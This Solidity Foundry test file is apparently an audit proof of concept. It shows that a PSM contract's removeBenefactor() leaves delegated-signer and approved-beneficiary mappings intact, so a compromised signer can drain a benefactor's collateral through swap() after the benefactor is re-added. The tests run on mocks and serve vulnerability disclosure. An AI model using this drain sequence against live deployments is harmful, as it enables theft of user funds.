// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.30;

import {Test} from "forge-std/Test.sol";

import {PSM} from "../src/PSM.sol";
import {IPSM} from "../src/IPSM.sol";

import {MockERC20} from "./mocks/MockERC20.sol";
import {MockOracleFeed} from "./mocks/MockOracleFeed.sol";

/// @title PoC_removeBenefactor
/// @notice Verifies that PSM.removeBenefactor() does NOT clear the nested mappings inside
///         BenefactorConfig (delegatedSigners, approvedBeneficiaries, fee exemptions, custom
///         fees). After remove + re-add, an attacker retains delegated-signer + approved-
///         beneficiary status WITHOUT re-confirmation, and can drain funds via swap().
contract PoC_removeBenefactor is Test {
    // -----------------------------------------------------------------
    // Actors
    // -----------------------------------------------------------------
    address admin = makeAddr("admin");
    address benefactorManager = makeAddr("benefactorManager");
    address collateralManager = makeAddr("collateralManager");
    address epochManager = makeAddr("epochManager");

    address benefactorA = makeAddr("benefactorA"); // the (compromised) benefactor
    address attacker = makeAddr("attacker"); // attacker = compromised delegated signer + beneficiary

    // Custodian wallets (must be distinct from benefactorA)
    address assetSendCustodian = makeAddr("assetSendCustodian");
    address assetReceiveCustodian = makeAddr("assetReceiveCustodian");
    address collateralSendCustodian = makeAddr("collateralSendCustodian");
    address collateralReceiveCustodian = makeAddr("collateralReceiveCustodian");

    // -----------------------------------------------------------------
    // Contracts
    // -----------------------------------------------------------------
    PSM internal psm;
    MockERC20 internal asset; // 18-decimals
    MockERC20 internal collateral; // 18-decimals stablecoin
    MockOracleFeed internal oracle; // returns $1.00

    // -----------------------------------------------------------------
    // Constants used in setup
    // -----------------------------------------------------------------
    uint128 constant PEG = 1e18; // $1.00
    uint128 constant LARGE = type(uint128).max; // no rate-limit friction
    uint128 constant SWAP_AMOUNT = 1_000e18; // 1000 stablecoins

    function setUp() public {
        // Tokens
        asset = new MockERC20("Asset", "AST", 18);
        collateral = new MockERC20("Collateral", "COL", 18);

        // Oracle: peg = $1.00, freshly updated
        oracle = new MockOracleFeed(PEG, block.timestamp);

        // Fund custodians
        asset.mint(assetSendCustodian, 1_000_000e18);
        collateral.mint(collateralSendCustodian, 1_000_000e18);

        // Fund benefactorA with collateral so swap can pull from it
        collateral.mint(benefactorA, 1_000_000e18);

        // Deploy PSM
        IPSM.GlobalConfig memory gc = IPSM.GlobalConfig({
            maxSwapForAssetPerEpoch: LARGE,
            maxSwapForCollateralPerEpoch: LARGE,
            defaultBenefactorMaxSwapForAssetPerEpoch: LARGE,
            defaultBenefactorMaxSwapForCollateralPerEpoch: LARGE,
            epochDuration: 1 hours,
            pegPrice: PEG,
            maxSwapForAssetPerPeriod: LARGE,
            maxSwapForCollateralPerPeriod: LARGE,
            defaultBenefactorMaxSwapForAssetPerPeriod: LARGE,
            defaultBenefactorMaxSwapForCollateralPerPeriod: LARGE,
            periodDuration: 1 days
        });

        address[] memory epochManagers = _arr(epochManager);
        address[] memory benefactorManagers = _arr(benefactorManager);
        address[] memory collateralManagers = _arr(collateralManager);
        address[] memory empty = new address[](0);

        psm = new PSM(
            address(asset),
            assetSendCustodian,
            assetReceiveCustodian,
            gc,
            admin,
            epochManagers, // _epochManagers
            empty, // _globalDisablers
            collateralManagers, // _collateralManagers
            empty, // _collateralDisablers
            benefactorManagers, // _benefactorManagers
            empty, // _benefactorDisablers
            empty // _pegMaintainers
        );

        // Add collateral (swapForAsset direction: collateral -> asset)
        vm.startPrank(collateralManager);
        IPSM.CollateralConfig memory cc = IPSM.CollateralConfig({
            sendCustodianAddress: collateralSendCustodian,
            receiveCustodianAddress: collateralReceiveCustodian,
            oracleFeed: address(oracle),
            maxSwapForAssetPerEpoch: LARGE,
            maxSwapForCollateralPerEpoch: LARGE,
            minOraclePrice: 0.9e18,
            maxOraclePrice: 1.1e18,
            maxOracleAge: 1 hours,
            isActive: true,
            decimals: 18,
            defaultSwapForAssetFee: 0, // 0 fee for simplicity
            defaultSwapForCollateralFee: 0,
            maxSwapForAssetPerPeriod: LARGE,
            maxSwapForCollateralPerPeriod: LARGE
        });
        psm.addCollateral(address(collateral), cc);
        vm.stopPrank();

        // Custodian wallets approve PSM to pull tokens during swaps
        vm.prank(assetSendCustodian);
        asset.approve(address(psm), type(uint256).max);
        vm.prank(collateralSendCustodian);
        collateral.approve(address(psm), type(uint256).max);

        // benefactorA approves PSM to pull collateral during swapForAsset
        vm.prank(benefactorA);
        collateral.approve(address(psm), type(uint256).max);
    }

    // -----------------------------------------------------------------
    // Helpers
    // -----------------------------------------------------------------
    function _arr(address a) internal pure returns (address[] memory r) {
        r = new address[](1);
        r[0] = a;
    }

    function _isActive(address b) internal view returns (bool) {
        (bool isActive,,,,) = psm.getBenefactorConfig(b);
        return isActive;
    }

    function _buildOrder(bool isSwapForAsset, uint128 nonce, address benefactor_, address beneficiary_)
        internal
        view
        returns (IPSM.Order memory)
    {
        return IPSM.Order({
            isSwapForAsset: isSwapForAsset,
            expiry: uint120(block.timestamp + 1 hours),
            nonce: nonce,
            chainId: block.chainid,
            benefactor: benefactor_,
            beneficiary: beneficiary_,
            collateral: address(collateral),
            amountIn: SWAP_AMOUNT,
            minAmountOut: SWAP_AMOUNT // peg == oracle == 1, 0 fee -> 1:1
        });
    }

    // =================================================================
    // TEST 1 - Storage-level proof: state persists across remove + re-add
    // =================================================================
    function test_RemoveBenefactor_DelegatedSignerAndBeneficiaryPersist() public {
        // ---- Step 1: Admin adds benefactorA ----
        vm.prank(benefactorManager);
        psm.addBenefactor(benefactorA);
        assertTrue(_isActive(benefactorA), "benefactorA should be active");

        // ---- Step 2: benefactorA designates attacker as delegated signer ----
        vm.prank(benefactorA);
        psm.setDelegatedSigner(attacker);
        assertEq(
            uint8(psm.getDelegatedSignerStatus(benefactorA, attacker)),
            uint8(IPSM.DelegatedSignerStatus.PENDING),
            "attacker should be PENDING"
        );

        // ---- Step 3: attacker confirms -> ACCEPTED ----
        vm.prank(attacker);
        psm.confirmDelegatedSigner(benefactorA);
        assertEq(
            uint8(psm.getDelegatedSignerStatus(benefactorA, attacker)),
            uint8(IPSM.DelegatedSignerStatus.ACCEPTED),
            "attacker should be ACCEPTED"
        );

        // ---- Step 4: benefactorA approves attacker as beneficiary ----
        vm.prank(benefactorA);
        psm.setApprovedBeneficiary(attacker, true);
        assertTrue(psm.isApprovedBeneficiary(benefactorA, attacker), "attacker should be approved beneficiary");

        // ---- Step 5: Admin removes benefactorA (delete config) ----
        vm.prank(benefactorManager);
        psm.removeBenefactor(benefactorA);
        assertFalse(_isActive(benefactorA), "benefactorA should be inactive after remove");

        // ---- Step 6: BUG - delegatedSigners[attacker] still ACCEPTED ----
        assertEq(
            uint8(psm.getDelegatedSignerStatus(benefactorA, attacker)),
            uint8(IPSM.DelegatedSignerStatus.ACCEPTED),
            "BUG: delegatedSigners status persists after removeBenefactor (should be REJECTED/default)"
        );

        // ---- Step 7: BUG - approvedBeneficiaries[attacker] still true ----
        // NOTE: isApprovedBeneficiary returns true if benefactor == beneficiary; here they differ.
        assertTrue(
            psm.isApprovedBeneficiary(benefactorA, attacker),
            "BUG: approvedBeneficiaries status persists after removeBenefactor (should be false)"
        );

        // ---- Step 8: Admin re-adds benefactorA (only sets isActive=true) ----
        vm.prank(benefactorManager);
        psm.addBenefactor(benefactorA);
        assertTrue(_isActive(benefactorA), "benefactorA active again");

        // ---- Step 9: After re-add, attacker is STILL ACCEPTED (no re-confirmation) ----
        assertEq(
            uint8(psm.getDelegatedSignerStatus(benefactorA, attacker)),
            uint8(IPSM.DelegatedSignerStatus.ACCEPTED),
            "BUG: attacker remains ACCEPTED delegated signer after re-add - no re-confirmation required"
        );

        // ---- Step 10: After re-add, attacker is STILL approved beneficiary ----
        assertTrue(
            psm.isApprovedBeneficiary(benefactorA, attacker),
            "BUG: attacker remains approved beneficiary after re-add"
        );
    }

    // =================================================================
    // TEST 2 - End-to-end: attacker drains funds via swap after re-add
    // =================================================================
    function test_RemoveBenefactor_AttackerCanSwapAfterReAdd() public {
        // ---- Setup delegation + beneficiary approval ----
        vm.startPrank(benefactorManager);
        psm.addBenefactor(benefactorA);
        vm.stopPrank();

        vm.prank(benefactorA);
        psm.setDelegatedSigner(attacker);
        vm.prank(attacker);
        psm.confirmDelegatedSigner(benefactorA);
        vm.prank(benefactorA);
        psm.setApprovedBeneficiary(attacker, true);

        // Snapshot balances before the incident
        uint256 attackerAssetBefore = asset.balanceOf(attacker); // 0
        uint256 benefactorCollateralBefore = collateral.balanceOf(benefactorA);

        // ---- Incident: admin removes benefactorA to "sever ties" with attacker ----
        vm.prank(benefactorManager);
        psm.removeBenefactor(benefactorA);

        // ---- Days later: admin re-adds benefactorA (e.g. after rotating benefactorA's key) ----
        vm.warp(block.timestamp + 7 days);
        // Keep oracle fresh so swap doesn't revert on staleness
        oracle.setPrice(PEG, block.timestamp);

        vm.prank(benefactorManager);
        psm.addBenefactor(benefactorA);

        // ---- Attack: attacker (still compromised) calls swap with attacker as beneficiary ----
        IPSM.Order memory order = _buildOrder({
            isSwapForAsset: true,
            nonce: 1,
            benefactor_: benefactorA,
            beneficiary_: attacker // attacker receives the asset output
        });

        vm.prank(attacker); // msg.sender = attacker - NOT benefactorA
        psm.swap(order); // <- this MUST revert if the system were safe; it succeeds.

        // ---- Verify attacker received asset, benefactorA lost collateral ----
        uint256 attackerAssetAfter = asset.balanceOf(attacker);
        uint256 benefactorCollateralAfter = collateral.balanceOf(benefactorA);

        assertGt(attackerAssetAfter, attackerAssetBefore, "attacker must have received asset output");
        assertLt(
            benefactorCollateralAfter,
            benefactorCollateralBefore,
            "benefactorA's collateral must have been debited"
        );
        assertEq(
            attackerAssetAfter - attackerAssetBefore,
            SWAP_AMOUNT,
            "attacker drained exactly SWAP_AMOUNT of asset (1:1, 0 fee)"
        );
        assertEq(
            benefactorCollateralBefore - benefactorCollateralAfter,
            SWAP_AMOUNT,
            "benefactorA lost exactly SWAP_AMOUNT of collateral"
        );

        // log for visibility
        emit log_named_decimal_uint("attacker asset gain", attackerAssetAfter - attackerAssetBefore, 18);
        emit log_named_decimal_uint("benefactorA collateral loss", benefactorCollateralBefore - benefactorCollateralAfter, 18);
    }

    // =================================================================
    // TEST 3 - Sanity: before the incident, attacker CAN swap (expected behavior).
    //          This proves the swap path itself is set up correctly.
    // =================================================================
    function test_Sanity_AttackerCanSwapBeforeRemove() public {
        vm.startPrank(benefactorManager);
        psm.addBenefactor(benefactorA);
        vm.stopPrank();

        vm.prank(benefactorA);
        psm.setDelegatedSigner(attacker);
        vm.prank(attacker);
        psm.confirmDelegatedSigner(benefactorA);
        vm.prank(benefactorA);
        psm.setApprovedBeneficiary(attacker, true);

        IPSM.Order memory order = _buildOrder(true, 1, benefactorA, attacker);
        vm.prank(attacker);
        psm.swap(order);

        assertEq(asset.balanceOf(attacker), SWAP_AMOUNT, "sanity: attacker can swap before remove");
    }

    // =================================================================
    // TEST 4 - Sanity: a fresh benefactorA with NO prior delegation cannot
    //          be swapped into by an unknown attacker (proves the bug is
    //          specifically about persistence, not a general auth bypass).
    // =================================================================
    function test_Sanity_FreshBenefactorBlocksUnknownAttacker() public {
        vm.prank(benefactorManager);
        psm.addBenefactor(benefactorA);
        // No setDelegatedSigner, no setApprovedBeneficiary

        IPSM.Order memory order = _buildOrder(true, 1, benefactorA, attacker);
        vm.expectRevert(abi.encodeWithSelector(IPSM.DelegationNotAuthorized.selector, attacker));
        vm.prank(attacker);
        psm.swap(order);
    }
}
